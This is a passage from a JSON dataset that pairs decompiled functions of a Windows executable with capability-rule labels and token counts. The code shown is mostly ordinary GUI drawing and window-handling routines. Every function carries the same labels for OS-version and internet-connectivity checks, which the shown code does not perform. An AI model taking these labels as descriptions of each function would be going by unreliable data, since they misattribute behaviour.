var_4h = fcn.004474cc();\n            }\n            var_4h = var_4h / var_14h - var_20h;\n        }\n        *in_FS_OFFSET = var_8h;\n        uStack88 = 0x4475f8;\n        iStack92 = 0x4475f0;\n        iVar2 = fcn.00402f1c();\n        return iVar2;\n    }\n    return var_4h;\n}\n",
        "token_count": 726
    },
    "00447694": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447694(uint arg_8h)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x447732;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_8h = 0;\n    if (in_EAX != NULL) {\n        while (*in_EAX != '\\0') {\n            while (((cVar1 = *in_EAX,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r'))) {\n                in_EAX = fcn.0040e770();\n            }\n            fcn.00405620();\n            iVar2 = fcn.00425570();\n            if (var_8h < iVar2) {\n                var_8h = iVar2;\n            }\n            if (*in_EAX == '\\r') {\n                in_EAX = in_EAX + 1;\n            }\n            if (*in_EAX == '\\n') {\n                in_EAX = in_EAX + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x447739;\n    uStack32 = 0x447731;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 348
    },
    "00447744": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447744(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uchar uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_6dh;\n    int32_t var_65h;\n    char var_5dh;\n    uint lpPoint;\n    uint var_58h;\n    uint dx;\n    uint dy;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint lprc;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4ch = *param_2;\n    var_48h = param_2[1];\n    var_4h = in_EAX;\n    fcn.00405fe8();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    *(var_4h + 0x58) = 0;\n    var_14h = 0;\n    if ((*(var_4h + 0x88) != '\\0') && (*(var_4h + 0x60) != 0)) {\n        fcn.004482ac();\n        cVar2 = fcn.0043bb34();\n        if (cVar2 != '\\0') {\n            fcn.0044ee0c();\n            iVar4 = fcn.00444a08();\n            if (iVar4 == *(var_4h + 0x60)) {\n                var_44h = *(var_4h + 0x60);\n                var_3ch = var_4ch;\n                var_38h = var_48h;\n                iVar4 = fcn.004474dc();\n                var_38h = var_38h + iVar4;\n                var_34h = fcn.00443d84();\n                var_30h = *(var_4h + 0x5c);\n                fcn.004501b4();\n                (**(**(var_4h + 0x60) + 0x40))();\n                lpPoint = 0;\n                var_58h = 0;\n                piVar1 = *(*(var_4h + 0x60) + 0x30);\n                if (piVar1 == NULL) {\n                    iVar4 = *(var_4h + 0x60);\n                    cVar2 = fcn.004047dc();\n                    if ((cVar2 != '\\0') && (*(iVar4 + 0x1c4) != 0)) {\n                        sub.user32.dll_ClientToScreen();\n                    }\n                }\n                else {\n                    (**(*piVar1 + 0x40))();\n                }\n                sub.user32.dll_OffsetRect();\n                fcn.004503d4();\n                fcn.004449d0();\n                fcn.0044d564();\n                fcn.004055c8();\n                var_10h = *(var_4h + 0x74);\n                var_40h = *0x492500;\n                var_8h = 0;\n                arg_8h = &var_44h;\n                iVar4 = fcn.00451b4c(arg_8h);\n                var_5dh = iVar4 == 0;\n                if ((var_5dh) && (*(var_4h + 0x15a) != 0)) {\n                    (**(var_4h + 0x158))(&var_44h);\n                }\n                if ((var_5dh == '\\0') || (*(var_4h + 0x60) == 0)) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = 1;\n                }\n                *(var_4h + 0x58) = uVar3;\n                if ((*(var_4h + 0x58) != '\\0') && (var_ch != 0)) {\n                    fcn.00447634(&stack0xfffffffc);\n                    (**(**(var_4h + 0x84) + 0x74))();\n                    (**(**(var_4h + 0x84) + 0xe8))(&var_6dh, var_8h);\n                    sub.user32.dll_OffsetRect(&var_6dh, var_3ch, var_38h);\n                    cVar2 = fcn.0040484c();\n                    if (cVar2 != '\\0') {\n                        iVar4 = fcn.00447694(&stack0xfffffffc);\n                        var_6dh = var_6dh - (iVar4 + 5);\n                        var_65h = var_65h - (iVar4 + 5);\n                    }\n                    fcn.00450324();\n                    *(var_4h + 100) = var_88h;\n                    *(var_4h + 0x68) = var_84h;\n                    fcn.00450324();\n                    *(var_4h + 0x6c) = var_88h;\n                    *(var_4h + 0x70) = var_84h;\n                    fcn.00450a08();\n                    (**(**(var_4h + 0x84) + 0xe4))(var_8h);\n                    fcn.00444b1c();\n                    if (var_14h < 1) {\n                        fcn.0044726c();\n                    }\n                    else {\n                        fcn.0044726c();\n                    }\n                    goto code_r0x00447aa6;\n                }\n            }\n        }\n    }\n    if (var_14h < 1) {\n        fcn.004474a4();\n    }\n    else {\n        fcn.0044726c();\n    }\ncode_r0x00447aa6:\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405554();\n    fcn.004060ac();\n    return;\n}\n",
        "token_count": 1434
    },
    "00447ae0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00447ae0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = 0;\n    while( true ) {\n        iVar1 = fcn.0040676c(param_1);\n        if (iVar1 <= iVar2) break;\n        if (param_2 == *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc)) {\n            uVar3 = *(*(in_EAX + 0xd0) + iVar2 * 0xc);\n            goto code_r0x00447b9e;\n        }\n        if (*(*(in_EAX + 0xd0) + iVar2 * 0xc) == -1) break;\n        iVar2 = iVar2 + 1;\n    }\n    uVar3 = *(in_EAX + 0xcc);\n    *(in_EAX + 0xcc) = *(in_EAX + 0xcc) + 1;\n    iVar1 = fcn.0040676c();\n    if (iVar1 <= iVar2) {\n        iVar2 = fcn.0040676c();\n        fcn.00406928(iVar2 + 1);\n    }\n    *(*(in_EAX + 0xd0) + iVar2 * 0xc) = uVar3;\n    *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc) = param_2;\n    *(*(in_EAX + 0xd0) + 8 + iVar2 * 0xc) = *(param_2 + 0x344) != 0;\ncode_r0x00447b9e:\n    return CONCAT44(uVar3, uVar3);\n}\n",
        "token_count": 401
    },
    "00447ba8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447ba8(void)\n\n{\n    if ((*(*0x499c20 + 0x68) == 0) || (*(*(*0x499c20 + 0x68) + 0x284) == 0)) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00447be4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447be4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0xf2) != 0) {\n        (**(in_EAX + 0xf0))();\n    }\n    iVar1 = sub.user32.dll_GetActiveWindow();\n    if (iVar1 == 0) {\n        sub.user32.dll_GetLastActivePopup(*(in_EAX + 0x30));\n    }\n    return CONCAT44(iVar1, iVar1);\n}\n",
        "token_count": 115
    },
    "00447c2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447c2c(void)\n\n{\n    int32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = 0;\n    if (*(in_EAX + 0xfa) != 0) {\n        (**(in_EAX + 0xf8))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uStack8 = fcn.004585f8();\n    }\n    return CONCAT44(uStack8, uStack8);\n}\n",
        "token_count": 112
    },
    "00447c6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00447c6c(int32_t param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uStack24;\n    \n    iVar4 = *(*0x499c20 + 0x68);\n    if (iVar4 == 0) {\ncode_r0x00447c97:\n        if ((iVar4 != *(in_EAX + 0x44)) && (*(in_EAX + 0x44) != 0)) {\n            iVar4 = fcn.00451b4c(param_1);\n            if (iVar4 == 1) goto code_r0x00447cb7;\n        }\n        uVar1 = 0;\n    }\n    else {\n        iVar3 = fcn.00451b4c(param_1);\n        if (iVar3 != 1) goto code_r0x00447c97;\ncode_r0x00447cb7:\n        uVar1 = 1;\n    }\n    uStack24 = param_2 & 0xffffff00 | uVar1;\n    if (uVar1 == 0) {\n        cVar2 = fcn.004047dc();\n        if ((((cVar2 != '\\0') && (*(param_1 + 0x6a) != '\\0')) && (*(param_1 + 0x60) != '\\0')) &&\n           ((*(param_1 + 0x1c) & 0x10) == 0)) {\n            fcn.0044a8b4();\n        }\n    }\n    return CONCAT44(uStack24, uStack24) & 0xffffffff000000ff;\n}\n",
        "token_count": 388
    },
    "00447d04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447d04(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))();\n    }\n    return 0;\n}\n",
        "token_count": 58
    },
    "00447d2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447d2c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xe2) != 0) {\n        (**(in_EAX + 0xe0))();\n    }\n    return 0;\n}\n",
        "token_count": 60
    },
    "00447ef0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447ef0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.0042fb10();\n    if ((cVar1 == '\\0') || (cVar1 = fcn.00458904(),  cVar1 == '\\0')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            uVar3 = fcn.004585f8(0, 0xffffffff);\n            sub.user32.dll_InvalidateRect(uVar3);\n        }\n    }\n    else {\n        iVar2 = fcn.00447e3c();\n        if (*(iVar2 + 8) == '\\0') {\n            fcn.00403af4();\n        }\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            fcn.004585f8();\n            fcn.0042f9e4();\n            (**(*in_EAX + 0x80))();\n        }\n        else {\n            uVar3 = fcn.004585f8(0, 0xffffffff);\n            sub.user32.dll_InvalidateRect(uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "00448128": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00448128(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 8) != '\\0') {\n        cVar1 = fcn.0042fb10();\n        if ((cVar1 != '\\0') &&\n           ((((*(in_EAX + 0x28) != '\\0' || (*(in_EAX + 0xc) != 0)) || (*(in_EAX + 0x10) != 0)) ||\n            ((*(in_EAX + 0x14) != 0 || (*(in_EAX + 0x18) != 0)))))) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 158
    },
    "00448160": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00448160(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 2)) {\n        *(in_EAX + 2) = param_2;\n        if ((*(in_EAX + 2) != '\\0') && (*(in_EAX[1] + 0x350) != '\\0')) {\n            fcn.00443544();\n        }\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "00448224": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00448224(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0043b75c();\n    if (iVar1 != 0) {\n        *0x499c2c = 0;\n        sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n        if ((*(*(in_EAX + 0x44) + 0x273) == '\\x01') && (*(*(in_EAX + 0x44) + 0x57) == '\\0')) {\n            fcn.0043fdb4();\n            fcn.00442bac();\n        }\n        fcn.00445490();\n        fcn.004455ec();\n        if (*(*0x499c20 + 100) != 0) {\n            uVar2 = fcn.004585f8();\n            sub.user32.dll_SetFocus(uVar2);\n        }\n        if (*(in_EAX + 0x14a) != 0) {\n            (**(in_EAX + 0x148))();\n        }\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "004482c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004482c4(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x448327;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    *0x499c24 = *0x499c24 + 1;\n    if (*0x499c24 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x499c1c != 0) {\n            iStack20 = 0x4482eb;\n            fcn.0043b898();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x499c34 != 0) {\n            iStack20 = *0x499c34;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        fcn.004193cc();\n        fcn.00406934();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 269
    },
    "00448634": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00448634(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x3c) != 0;\n}\n",
        "token_count": 49
    },
    "0044863c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044863c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x3c) == 0) {\n        fcn.0044880c();\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "004487d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004487d4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.00448634();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x42) == '\\0')) {\n        uVar2 = fcn.00448770();\n        sub.comctl32.dll_ImageList_Destroy(uVar2);\n    }\n    *(in_EAX + 0x3c) = 0;\n    fcn.0040484c();\n    return;\n}\n",
        "token_count": 127
    },
    "00448a94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448a94(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    uint in_EDX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.00448634();\n    if (cVar1 != '\\0') {\n        if (arg_8h == '\\0') {\n            if (*(in_EAX + 0x54) == 0) {\n                piVar3 = fcn.004293dc();\n                *(in_EAX + 0x54) = piVar3;\n                fcn.0042a7e0();\n                (**(*piVar3 + 0x40))();\n                (**(*piVar3 + 0x34))();\n            }\n            fcn.004299b0();\n            fcn.00424fb8();\n            fcn.00418448(&var_28h, *(in_EAX + 0x30));\n            fcn.004299b0(&var_28h);\n            fcn.0042535c();\n            fcn.004299b0(0, 0, 0, 0, 0xffffffff, 0, 0);\n            uVar2 = fcn.00425714();\n            uVar2 = fcn.00448770(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n            fcn.00418448(&var_18h, arg_10h + *(in_EAX + 0x30));\n            fcn.004299b0();\n            var_8h = fcn.00425714();\n            fcn.00424fb8();\n            uVar2 = fcn.00425714();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt\n                      (uVar2, arg_14h + 1, arg_10h + 1, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n            fcn.00424fb8();\n            uVar2 = fcn.00425714();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt(uVar2, arg_14h, arg_10h, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n        }\n        else {\n            uVar2 = fcn.00448484(arg_ch);\n            fcn.00448a6c(uVar2);\n            uVar2 = fcn.00448484();\n            uVar2 = fcn.00425714(arg_14h, arg_10h, 0, 0, uVar2);\n            uVar2 = fcn.00448770(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 777
    },
    "00449298": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00449298(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        iVar2 = fcn.00448978();\n        return 0 < iVar2;\n    }\n    cVar1 = fcn.004047dc();\n    if ((cVar1 != '\\0') && (cVar1 = fcn.004491a8(),  cVar1 != '\\0')) {\n        return false;\n    }\n    return true;\n}\n",
        "token_count": 133
    },
    "0044934c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044934c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    int32_t iStack112;\n    uint uStack108;\n    uchar *puStack104;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_30h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    puStack84 = 0x449369;\n    var_4h = in_EAX;\n    fcn.0041b940();\n    puStack84 = 0x449378;\n    fcn.0041b940();\n    puStack84 = 0x449384;\n    var_8h = fcn.004293dc();\n    uStack88 = 0x4495d0;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = fcn.0041b714();\n    (**(*var_8h + 0x54))();\n    puStack104 = 0x4493b7;\n    fcn.0041b734(var_18h + iVar1, var_18h + iVar1 >> 0x1f);\n    puStack104 = 0x4493c3;\n    var_10h = fcn.004293dc();\n    uStack108 = 0x4495b3;\n    iStack112 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff90;\n    puStack104 = &stack0xfffffffc;\n    (**(*var_10h + 0x54))();\n    var_ch = fcn.004293dc();\n    (**(*var_ch + 0x40))();\n    (**(*var_ch + 0x34))();\n    var_14h = fcn.004293dc();\n    fcn.0042a7e0();\n    (**(*var_14h + 0x40))();\n    (**(*var_14h + 0x34))();\n    fcn.00418448(&fcn.0044934c::var_30h, *(var_4h + 0x30));\n    fcn.00449978();\n    puVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar1 = (**(*var_8h + 0x20))();\n    iVar1 = iVar1 / *(var_4h + 0x30);\n    if (-1 < iVar1 + -1) {\n        do {\n            var_20h = iVar1;\n            if (var_1ch == 0) break;\n            iVar1 = (**(*var_8h + 0x2c))();\n            iVar1 = iVar1 / *(var_4h + 0x34);\n            if (-1 < iVar1 + -1) {\n                do {\n                    if (var_1ch == 0) break;\n                    fcn.00418470(&fcn.0044934c::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.0044934c::var_40h;\n                    uVar2 = fcn.004299b0();\n                    fcn.004299b0(uVar2);\n                    fcn.00425228(puVar3);\n                    fcn.00418470(&fcn.0044934c::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.0044934c::var_40h;\n                    uVar2 = fcn.004299b0();\n                    fcn.004299b0(uVar2);\n                    fcn.00425228(puVar3);\n                    fcn.004488ac();\n                    var_1ch = var_1ch + -1;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n            }\n            var_20h = var_20h + -1;\n            iVar1 = var_20h;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = puVar3;\n    fcn.00404650();\n    fcn.00404650();\n    fcn.0044997c();\n    return;\n}\n",
        "token_count": 1033
    },
    "00449834": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00449834(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (*0x499c50 == 0) {\n        *0x499c50 = fcn.0040e3a4();\n        if (0x5ffff < *0x499c50) {\n            iVar1 = sub.kernel32.dll_GetModuleHandleA_2();\n            if (iVar1 != 0) {\n                *0x499c54 = sub.kernel32.dll_GetProcAddress_1();\n            }\n        }\n    }\n    puStack40 = 0x449893;\n    iVar1 = fcn.00420ae0(0);\n    uStack44 = 0x44992e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (*0x499c54 == NULL) {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        puStack40 = &stack0xfffffffc;\n        uVar3 = fcn.00448770(iVar1);\n        iVar1 = sub.comctl32.dll_ImageList_Write();\n        if (iVar1 == 0) {\n            fcn.0040dbb8();\n            fcn.00404ec4();\n        }\n    }\n    else {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        uVar3 = 1;\n        puStack40 = &stack0xfffffffc;\n        uVar2 = fcn.00448770(1, iVar1);\n        iVar1 = (**0x499c54)(uVar2);\n        if (iVar1 != 0) {\n            fcn.0040dbb8();\n            fcn.00404ec4();\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    uStack48 = 0x449935;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 471
    },
    "0044997c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044997c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (0 < *(in_EAX + 0x5c)) {\n        *(in_EAX + 0x5c) = *(in_EAX + 0x5c) + -1;\n    }\n    if (*(in_EAX + 0x58) != '\\0') {\n        *(in_EAX + 0x58) = 0;\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "0044a0fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044a0fc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ffc4();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x30) = uVar1;\n    iVar2 = fcn.00404620();\n    *(in_EAX + 0x34) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x44a280;\n    *(in_EAX + 0x58) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 269
    },
    "0044a378": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
